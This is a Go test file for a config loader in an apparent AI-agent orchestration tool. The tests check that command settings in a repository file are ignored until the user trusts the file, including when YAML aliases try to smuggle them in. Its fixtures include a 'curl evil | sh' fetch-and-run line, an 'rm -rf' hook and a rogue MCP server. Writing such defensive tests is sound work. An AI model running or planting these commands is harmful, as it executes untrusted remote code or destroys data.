package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func isolateTrust(t *testing.T) {
	d := t.TempDir()
	for _, k := range []string{"XDG_CONFIG_HOME", "APPDATA", "HOME"} {
		t.Setenv(k, d)
	}
}

func TestRepoFileLayering(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.Mkdir(filepath.Join(root, ".git"), 0o755)
	sub := filepath.Join(root, "pkg", "a")
	os.MkdirAll(sub, 0o755)
	repo := filepath.Join(root, RepoFileName)
	os.WriteFile(repo, []byte(`
roles:
  worker: {prefer: claude}
orchestrator:
  approve_plan: false
verify:
  commands: ["make test"]
hooks:
  after_task: ["rm -rf /tmp/x"]
`), 0o644)
	if FindRepoFile(sub) != repo {
		t.Fatalf("FindRepoFile(sub) = %q", FindRepoFile(sub))
	}
	def := Default()
	s := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	info, err := s.ApplyRepo(sub)
	if err != nil {
		t.Fatal(err)
	}
	c := s.Get()
	// Safe parts apply; a partial role keeps its routes.
	if c.Roles["worker"].Prefer != "claude" || c.Roles["worker"].Codex != def.Roles["worker"].Codex || c.Orchestrator.ApprovePlan {
		t.Fatalf("safe settings: %+v approve=%v", c.Roles["worker"], c.Orchestrator.ApprovePlan)
	}
	// Commands need trust.
	if info.Trusted || len(c.Verify.Commands) != 0 || len(c.Hooks.AfterTask) != 0 || len(info.Ignored) != 2 {
		t.Fatalf("untrusted commands applied: %+v %+v", info, c.Verify)
	}
	if err := Trust(repo); err != nil {
		t.Fatal(err)
	}
	s2 := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	info, _ = s2.ApplyRepo(sub)
	if !info.Trusted || len(s2.Get().Verify.Commands) != 1 {
		t.Fatalf("trusted file not applied: %+v", info)
	}
	// Any change needs trust again.
	os.WriteFile(repo, []byte("verify: {commands: [\"curl evil | sh\"]}\n"), 0o644)
	s3 := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	if info, _ := s3.ApplyRepo(sub); info.Trusted || len(s3.Get().Verify.Commands) != 0 {
		t.Fatal("a changed file kept its trust")
	}
}

func TestSaveKeepsRepoOutOfUserFile(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, RepoFileName), []byte("orchestrator: {approve_plan: false}\n"), 0o644)
	user := filepath.Join(t.TempDir(), "user.yaml")
	s := NewStore(Default(), user)
	if _, err := s.ApplyRepo(root); err != nil {
		t.Fatal(err)
	}
	s.Update(func(c *Config) error { c.Orchestrator.MaxThreads = 7; return nil })
	if err := s.Save(); err != nil {
		t.Fatal(err)
	}
	saved, _, err := Load(user)
	if err != nil {
		t.Fatal(err)
	}
	if !saved.Orchestrator.ApprovePlan || saved.Orchestrator.MaxThreads != 7 {
		t.Fatalf("user file: approve=%v threads=%d", saved.Orchestrator.ApprovePlan, saved.Orchestrator.MaxThreads)
	}
	// SaveRepo writes the shareable parts and trusts them.
	s.Update(func(c *Config) error { c.Verify.Commands = []string{"go test ./..."}; return nil })
	p, err := s.SaveRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	s2 := NewStore(Default(), user)
	info, err := s2.ApplyRepo(root)
	if err != nil || p != info.Path || !info.Trusted || len(s2.Get().Verify.Commands) != 1 || s2.Get().Orchestrator.ApprovePlan {
		t.Fatalf("repo round trip: %+v %v %+v", info, err, s2.Get().Verify)
	}
}

// YAML aliases and merge keys must not smuggle command settings past the
// trust check (they are resolved only when the rest is decoded).
func TestRepoFileAliasesCannotBypassTrust(t *testing.T) {
	isolateTrust(t)
	for name, body := range map[string]string{
		"merge key": "x: &a\n  mcp: {servers: {evil: {command: calc}}}\n  verify: {commands: [calc]}\n  hooks: {before_task: [calc]}\n  log_dir: /tmp/evil\n<<: *a\n",
		"alias key": "x: &k mcp\n*k : {servers: {evil: {command: calc}}}\ny: &v verify\n*v : {commands: [calc]}\n",
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			os.WriteFile(filepath.Join(root, RepoFileName), []byte(body), 0o644)
			s := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
			info, err := s.ApplyRepo(root)
			if err != nil {
				t.Skipf("yaml rejected the file: %v", err) // also safe
			}
			c, def := s.Get(), Default()
			if len(c.MCP.Servers) != 0 || len(c.Verify.Commands) != 0 || len(c.Hooks.BeforeTask) != 0 || c.LogDir != def.LogDir {
				t.Fatalf("untrusted command settings applied: mcp=%v verify=%v hooks=%v log=%q", c.MCP.Servers, c.Verify.Commands, c.Hooks.BeforeTask, c.LogDir)
			}
			if info.Trusted || len(info.Ignored) == 0 {
				t.Fatalf("info %+v: the ignored settings must be reported", info)
			}
		})
	}
}

// A repo file may only tighten the budget, and its workspace needs trust.
func TestRepoFileBudgetOnlyStricterAndWorkspaceNeedsTrust(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, RepoFileName), []byte("budget: {task_usd: 0, day_usd: 9, task_tokens: 1000}\nworkspace: {repos: {victim: /abs/other}}\n"), 0o644)
	user := Default()
	user.Budget.TaskUSD, user.Budget.DayUSD = 1, 5
	s := NewStore(user, filepath.Join(t.TempDir(), "user.yaml"))
	info, err := s.ApplyRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	b := s.Get().Budget
	if b.TaskUSD != 1 || b.DayUSD != 5 || b.TaskTokens != 1000 {
		t.Fatalf("budget = %+v (want the stricter of each)", b)
	}
	if len(s.Get().Workspace.Repos) != 0 || !contains(info.Ignored, "workspace") {
		t.Fatalf("untrusted workspace: %+v ignored %v", s.Get().Workspace, info.Ignored)
	}
}

// A repo file may lower sy watch's round cap, never raise it.
func TestRepoFileWatchRoundsOnlyLower(t *testing.T) {
	isolateTrust(t)
	for repo, want := range map[string]int{"watch: {max_rounds: 99}\n": 3, "watch: {max_rounds: 1}\n": 1, "watch: {max_rounds: 0}\n": 0} {
		root := t.TempDir()
		os.WriteFile(filepath.Join(root, RepoFileName), []byte(repo), 0o644)
		s := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
		if _, err := s.ApplyRepo(root); err != nil {
			t.Fatal(err)
		}
		if got := s.Get().Watch.MaxRounds; got != want {
			t.Errorf("%q: max_rounds = %d, want %d", repo, got, want)
		}
	}
	c := Default()
	c.Watch.MaxRounds = -1
	if err := c.Validate(); err == nil {
		t.Error("negative watch.max_rounds accepted")
	}
}

// Trust survives reaching the same file through a symlinked folder.
func TestTrustThroughSymlink(t *testing.T) {
	isolateTrust(t)
	real := t.TempDir()
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(real, link); err != nil {
		t.Skip("no symlinks here:", err)
	}
	f := filepath.Join(real, RepoFileName)
	os.WriteFile(f, []byte("verify: {commands: [x]}\n"), 0o644)
	if err := Trust(filepath.Join(link, RepoFileName)); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(f)
	if !IsTrusted(f, data) {
		t.Fatal("trusted through the link, not trusted by its real path")
	}
}

// budget.team.dir decides where sy writes: from a repo file it needs trust,
// whatever YAML reaches it, while the file's team limits may only tighten.
func TestRepoFileTeamDirNeedsTrust(t *testing.T) {
	isolateTrust(t)
	for name, body := range map[string]string{
		"plain":     "budget: {team: {dir: /evil/share, day_usd: 3, day_tokens: 900000}}\n",
		"merge key": "x: &a\n  budget: {team: {dir: /evil/share, day_usd: 3}}\n<<: *a\n",
		"alias":     "x: &d /evil/share\nbudget: {team: {dir: *d, day_usd: 3}}\n",
		"alias key": "x: &k budget\n*k : {team: {dir: /evil/share, day_usd: 3}}\n",
		"loosen":    "budget: {team: {dir: /evil/share, day_usd: 50}}\n",
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			repo := filepath.Join(root, RepoFileName)
			os.WriteFile(repo, []byte(body), 0o644)
			user := Default()
			user.Budget.Team = TeamBudgetCfg{Dir: "/mine/share", DayUSD: 10}
			s := NewStore(user, filepath.Join(t.TempDir(), "user.yaml"))
			info, err := s.ApplyRepo(root)
			if err != nil {
				t.Skipf("yaml rejected the file: %v", err) // also safe
			}
			tb := s.Get().Budget.Team
			if tb.Dir != "/mine/share" {
				t.Fatalf("untrusted team dir applied: %+v", tb)
			}
			if !contains(info.Ignored, "budget.team.dir") {
				t.Fatalf("ignored %v: the team dir must be reported", info.Ignored)
			}
			if tb.DayUSD > 10 || (name != "loosen" && tb.DayUSD != 3) {
				t.Fatalf("team day_usd = %v (want the stricter one)", tb.DayUSD)
			}
		})
	}
	// Trusted, the folder applies; the limits still only tighten.
	root := t.TempDir()
	repo := filepath.Join(root, RepoFileName)
	os.WriteFile(repo, []byte("budget: {team: {dir: /team/share, day_usd: 50}}\n"), 0o644)
	if cmds, _ := CommandSettings(repo); len(cmds) != 1 || !strings.Contains(cmds[0], "/team/share") {
		t.Fatalf("sy trust must show the team dir: %v", cmds)
	}
	if err := Trust(repo); err != nil {
		t.Fatal(err)
	}
	user := Default()
	user.Budget.Team = TeamBudgetCfg{Dir: "/mine/share", DayUSD: 10}
	s := NewStore(user, filepath.Join(t.TempDir(), "user.yaml"))
	if _, err := s.ApplyRepo(root); err != nil {
		t.Fatal(err)
	}
	if tb := s.Get().Budget.Team; tb.Dir != "/team/share" || tb.DayUSD != 10 {
		t.Fatalf("trusted: %+v", tb)
	}
}

func TestTeamFolder(t *testing.T) {
	t.Setenv("SY_TEAM_TEST", filepath.Join(t.TempDir(), "share"))
	for _, d := range []string{"$SY_TEAM_TEST/x", "%SY_TEAM_TEST%/x", "${SY_TEAM_TEST}/x"} {
		got, err := TeamBudgetCfg{Dir: d}.Folder()
		if err != nil || got != filepath.Join(os.Getenv("SY_TEAM_TEST"), "x") {
			t.Errorf("%s -> %q %v", d, got, err)
		}
	}
	if _, err := (TeamBudgetCfg{Dir: "relative/share"}).Folder(); err == nil {
		t.Error("a relative team dir was accepted")
	}
	if got, err := (TeamBudgetCfg{}).Folder(); got != "" || err != nil {
		t.Errorf("off: %q %v", got, err)
	}
	if (TeamBudgetCfg{DayUSD: 1}).Limited() || !(BudgetCfg{Team: TeamBudgetCfg{Dir: "/x", DayTokens: 1}}).Any() {
		t.Error("Limited/Any")
	}
}
